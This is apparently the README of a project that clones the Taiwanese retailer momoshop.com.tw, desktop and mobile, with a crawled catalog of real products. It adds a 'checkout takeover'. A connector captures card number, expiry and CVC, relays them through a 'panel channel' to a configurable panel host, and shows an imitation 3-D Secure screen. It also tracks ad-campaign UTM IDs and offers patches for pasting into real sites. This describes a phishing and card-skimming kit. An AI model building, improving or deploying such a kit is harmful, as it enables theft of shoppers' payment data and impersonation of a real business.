# 台灣 momo · 結帳接管還原站

`https://www.momoshop.com.tw` 的 **1:1 靜態還原** + 依 `建站結賬頁契約.md` v1.0 實作的 **`/bp` 結帳接管**。

- 首頁：真實 DOM 鏡像（原始 CSS + 原始圖片 + 原始 header/footer），區塊順序、間距、字級與線上一致
- 內頁：商品 / 分類 / 購物車 / 結帳 / 訂單完成，全部沿用首頁真實 header + footer 與 design token
- 結帳頁：逐條對齊契約（R1–R3、6 個固定 id、`__BP_CART__`、`POST /api/checkout`、CSP 方案 A）

```
台灣momo/
├─ server.mjs                  # 靜態站 + /api/cart + /api/checkout + /bp 靜態 + 契約 7.1 響應頭
├─ package.json
├─ 建站结账页契约.md            # 權威契約（本專案的驗收標準）
├─ site/                       # 站點根目錄（可直接靜態託管）
│  ├─ index.html               # 首頁（1:1 鏡像，桌面）
│  ├─ category/index.html      # 商品分類
│  ├─ product/<i_code>.html    # 商品詳情（32 個真實商品）
│  ├─ cart/index.html          # 購物車
│  ├─ checkout/index.html      # 結帳頁（契約主體，桌面）
│  ├─ order/index.html         # 訂單完成頁
│  ├─ m/                       # ★ 行動版（m.momoshop.com.tw 風格）
│  │  ├─ index.html            #   行動版首頁（真實 bt_7_* banner + 圖文樓層）
│  │  ├─ category/index.html   #   分類
│  │  ├─ product/<code>.html   #   商品詳情
│  │  ├─ cart/index.html       #   購物車
│  │  ├─ checkout/index.html   #   ★ 訪客結帳（免登入 + 契約六 id）
│  │  ├─ order/index.html      #   訂單完成
│  │  └─ assets/css/momo-mobile.css  # 行動版樣式（390 基準）
│  ├─ data/catalog.json        # ★ 全量商品目录（18,823 个，3.73MB，动态渲染数据源）
│  ├─ assets/                  # 原始 CSS / 圖片 / 字型（本地化）
│  ├─ _partials/               # header / footer 片段（建頁來源）
│  └─ bp/                      # 我方交付：connector 整套
│     ├─ connector.js          # 卡片接管 + 提交 + 面板通道 + 3DS
│     ├─ connector.css
│     ├─ config.json
│     ├─ socket.io.min.js      # 面板通道 client（離線回環版）
│     ├─ bp-template-runtime.js
│     ├─ 3ds/img/*             # visa / mastercard / 3d-secure-*
│     └─ README.md             # 對接說明
├─ 对接补丁/                    # 可直接貼進真實站點的逐段補丁
├─ lib/render.mjs             # ★ 目錄驅動渲染器（桌面 + 行動雙模板 + 分頁器）
├─ _ref/                       # 抓取與截圖證據（不參與部署）
│  ├─ cap/home_dom.html        # 首頁原始渲染 DOM
│  ├─ shots/*.png              # 各頁截圖（桌面 + 行動）
│  ├─ products.json            # 從首頁抽出的 32 個商品
│  └─ tw-districts.json        # 台灣 22 縣市 / 368 鄉鎮區
└─ _tools/                     # 建置腳本
   ├─ cdp-capture.mjs          # CDP 抓渲染後 DOM + 全量資源（支援 mobile 視口）
   ├─ mirror.mjs               # 資源本地化 + 改寫
   ├─ fixcss.mjs / retry.mjs   # CSS 与漏抓资源补齐
   ├─ build-pages.mjs          # 桌面內頁
   ├─ build-mobile.mjs         # ★ 行動版全站（含訪客結帳）
   ├─ crawl-catalog.mjs        # ★ 全量商品爬取（斷點續爬 + 編碼回落）
   ├─ build-catalog.mjs        # ★ 目錄清洗去重
   ├─ check-images.mjs         # ★ 商品存活校驗（圖片 404 / 無價格剔除）
   ├─ make-badges.mjs          # 生成 3DS 徽章 PNG
   ├─ verify.mjs               # 桌面契約 §9 十項自檢
   ├─ verify-mobile.mjs        # ★ 行動版十一項自檢
   ├─ shot.mjs / measure.mjs   # 截圖 / 溢出量測
   └─ extract-products.mjs
```

## 執行

```bash
node server.mjs          # http://127.0.0.1:8790
```

| 路由 | 說明 |
|---|---|
| `/` · `/main/Main.jsp` | 首頁（鏡像） |
| `/category` · `/category/LgrpCategory.jsp?l_code=` | 商品分類 |
| `/product/14295303` · `/goods/GoodsDetail.jsp?i_code=14295303` | 商品詳情 |
| `/cart` · `/cart/CartList.jsp` | 購物車 |
| `/checkout` · `/cart/Checkout.jsp` | 結帳（**無尾斜杠、不 301**） |
| `/order/<order_number>` | 訂單完成 |
| `GET /api/cart` | 購物車資料（結構 = `__BP_CART__`） |
| `POST /api/checkout` | 提交（永遠 200 + JSON、冪等、單號複用、Origin 比對） |
| `/bp/*` | connector 靜態資源 |

> 路由帶 momo 真實 URL 別名（`Main.jsp` / `LgrpCategory.jsp` / `GoodsDetail.jsp` / `CartList.jsp` / `Checkout.jsp`），
> 接站時前端 `href` 不用改一行。

## 行動版（`m.momoshop.com.tw` 風格，**訪客結帳**）

手機版面是獨立一套，`/m` 前綴，390 基準寬，DPR 3，底部 tab bar + 固定結算條。

| 路由 | 頁面 |
|---|---|
| `/m` · `/m/main/Main.jsp` | 行動版首頁（真實 `bt_7_*` banner / 圖文樓層 + 雙列商品流） |
| `/m/category` | 分類 |
| `/m/product/<code>` · `/m/goods.momo?i_code=` | 商品詳情（底部固定「加入購物車／立即購買」） |
| `/m/cart` · `/m/cart/CartList.jsp` | 購物車（全選 + 底部結算條） |
| `/m/checkout` · `/m/cart/Checkout.jsp` | **訪客結帳**（免登入 + 契約六 id） |
| `/m/order/<order_number>` | 訂單完成 |

**訪客結帳改造點**（相對原 momo 登入結帳）：

- 移除會員登入攔截 → 訪客表單（姓名／手機／Email／縣市＋鄉鎮區聯動／郵遞區號／詳細地址）
- 配送方式：賣家宅配（免運）／超商取貨（$60，含門市選擇）
- 付款方式：信用卡（卡片三欄首屏可見，走契約）／ATM（≤$5,000）／超商取貨付款／LINE Pay
- 發票：手機條碼載具／momo 會員載具／紙本
- 台灣 22 縣市 + 368 鄉鎮區真實聯動資料（`_ref/tw-districts.json`）

行動版自檢（`node _tools/verify-mobile.mjs`）**11/11 全過**。

## 商品目录（全量爬取）

不是只抄首页露出的一屏。目录来自 **Wayback 的 momo 分类列表页快照**（`/category/LgrpCategory.jsp`），每页 ~54 个商品卡，逐页解析 `i_code / 名称 / 价格 / 主图`。

```
_tools/crawl-catalog.mjs     # 爬 2437 个 l_code → _ref/catalog_raw.jsonl（断点续爬）
_tools/build-catalog.mjs     # 清洗去重 → site/data/catalog.json
_tools/check-images.mjs      # 存活校验：丢掉「无价格」和「图片 404」的商品
```

**数据保真度做了三层校验**（宁可少，不留假数据）：

| 层 | 处理 |
|---|---|
| 编码 | 逐页严格 UTF-8 解码，失败回落 Big5（momo 的 JSP 页面编码不统一，直接 `r.text()` 会出 `銆怲` 乱码） |
| 名称 | 只收 `goodsimg/` 商品图对应的卡；品牌块 / 活动块（如「毛寶」「momo」）直接丢弃 |
| 存活 | HEAD 校验商品图，404/403 的下架商品剔除；无价格的「售完」商品剔除 |

当前：**18,823 个商品**，价格区间 `$9 ~ $368,830`，`catalog.json` 3.73 MB，分页 **392 页**（48/页）。

| 阶段 | 数量 |
|---|---|
| 分类快照 | 2,437 个 `l_code` → 爬完 2,126 页（222 空页 / 18 失败） |
| 原始商品卡 | 25,922 |
| 去重后 | 24,784 |
| 无价格剔除 | −4,133 |
| 死图剔除 | −1,828 |
| **上线商品** | **18,823**（76% 存活） |

站内搜索实测：「除濕機」命中 23 件。

## 首页链接接线

首页是从线上抓的渲染后 DOM，抓取时所有链接被改写成 `href="#" data-orig-href="原 URL"`，结果 **242 个链接全是死链**——页面能看，点不动。

`_tools/relink-home.mjs` 把 `data-orig-href` 还原成站内路由（构建时自动执行）：

| 原始 URL | 站内路由 | 数量 |
|---|---|---|
| `GoodsDetail.jsp?i_code=NNN` | `/product/NNN` | 75 |
| `LgrpCategory.jsp?l_code=` | `/category` | 33 |
| `searchShop.jsp?keyword=X` | `/category?kw=X` | 23 |
| `cmmedm.jsp`（活动页） | `/category` | 83 |
| `cart/CartList.jsp` / `#TopCart` | `/cart` | 1 |
| 会员 / 客服 / 外部社群 | 保留 `#` | 26 |

另注入搜索交互：首页搜索框回车或点「搜尋」→ `/category?kw=`。

抽检 26 条链接全部返回 200；目录里没有的商品返回 **404「此商品已下架」**，不再拿别的商品顶替。

## 目录驱动渲染

2 万个商品不可能生成 4 万个静态 HTML，所以列表/详情页改成**按目录动态渲染**：

- `lib/render.mjs` —— 桌面 + 行动双模板、商品卡、分页器
- `server.mjs` —— 启动时 `loadCatalog()`，`/product/<code>` 静态页优先、未收录的从目录渲染
- `/category?page=N&kw=关键词` —— 分页（48/页）+ 站内搜索

## 接站補丁包

`對接補丁/` 是可直接貼進真實站點的逐段補丁：

| 文件 | 用途 |
|---|---|
| `README.md` | 5 步上線 + 驗收 + 灰度回滾 |
| `01-head.html` | UTM 捕獲 + `__BP_CART__` 骨架 + connector 資源 |
| `02-checkout-body.html` | 六個固定 id 的 DOM 片段 |
| `03-api-cart.mjs` / `04-api-checkout.mjs` | 兩個接口服務端實作 |
| `05-_headers` | CSP 方案 A 全套響應頭 |
| `06-audit.md` | 對 `www.momoshop.com.tw` 的合規審計 + 三個必改點 |

## 契約落點對照

| 契約條目 | 實作 |
|---|---|
| §3 head ①②③ 順序 | `checkout/index.html`：UTM 捕獲 → `__BP_CART__` 骨架 → `connector.css` + `defer connector.js` |
| §4 六個固定 id | `#bp-card-number` `#bp-card-expiry` `#bp-card-cvc` `#bp-total` `#bp-error` `#bp-submit` |
| §4.1 寫值派發 input | `connector.js` → `CardField.set()` / `onPaste()` 一律 `fire(el,'input')` |
| §4.1 提交中不 disabled | 只用 `aria-busy` + 內部 `Submitting` 位 |
| §5.1 原地 mutate | `Cart.load()` 直接改 `window.__BP_CART__` 欄位 |
| §5.2 `/api/cart` 兜底 | 骨架為空時 `fetch('/api/cart')` 回填 |
| §6.1 200 + JSON / 冪等 / 單號複用 | `server.mjs` `POST /api/checkout` |
| §7.1 CSP 方案 A | `server.mjs` `baseHeaders()`，`script-src 'self' 'unsafe-inline'`（無 nonce/hash） |
| §7.4 驗證屏三件事 | `connector.js` `ThreeDS.build()`：絕對化 runtime + 注入 `<base href="/bp/3ds/">` + 佔位符替換 |
| §8 禁止清單 | 無 `<base>`、無 Service Worker、無驗證碼、無 `type="number"`、無全域 `iframe{display:none}` |

## 自檢（契約 §9）已驗證

| # | 檢查 | 結果 |
|---|---|---|
| 1 | `curl -sI /checkout` | `200`，無 `Location`，CSP 含 `wss://` |
| 2 | `/bp/connector.js` | `200` |
| 3 | `/bp/3ds/img/visa.svg` | `200` |
| 4 | UTM 捕獲 | `__BP_UTM__` / `sessionStorage.bp_utm` 含 `adset_id` |
| 5 | 三個卡片欄位 | `3` |
| 6 | 金額三處同源 | `true` |
| 7 | 卡片 `input` 監聽 | 存在，格式化 `4242 4242 4242 4242` / `12/28` |
| 8 | 375 寬橫向溢出 | `scrollWidth === innerWidth`（375） |
| 9 | 斷網點支付 | `#bp-error` 出文案、欄位不清空、按鈕可再點 |
| 10 | 單號一致 | `__BP_CART__.order_number === 回應 order_number` |

## 後續要換掉的兩處

1. `site/bp/config.json` 的 `panel_host` / `logname` 換成面板實際值。
2. `site/bp/socket.io.min.js` 是離線回環實作；正式環境用官方 `socket.io-client@4.7.4` 構建產物覆蓋即可（API 子集一致）。
